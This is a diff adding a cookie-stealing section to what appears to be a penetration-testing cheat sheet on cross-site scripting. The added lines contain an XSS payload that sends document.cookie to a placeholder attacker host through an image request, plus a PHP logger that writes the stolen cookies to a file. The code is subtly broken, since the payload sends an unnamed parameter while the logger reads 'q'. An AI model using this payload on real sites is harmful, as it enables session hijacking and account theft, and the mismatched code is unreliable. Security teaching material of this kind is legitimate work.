@@ -100,6 +100,24 @@ FINDING XSS (cross site scripting)
 Display the current cookie:
 - `<script>alert(document.cookie)</script>`
 
+Cookie stealing via XSS:
+```bash
+<script>
+var i = new Image();
+i.src="http://<MyIP>/log.php?="+document.cookie;
+</script>
+```
+- log.php
+```bash
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+fclose($fp)
+?>
+```
+
 *CheatSheet Commands:*
 
 | **Command** | **Description** |
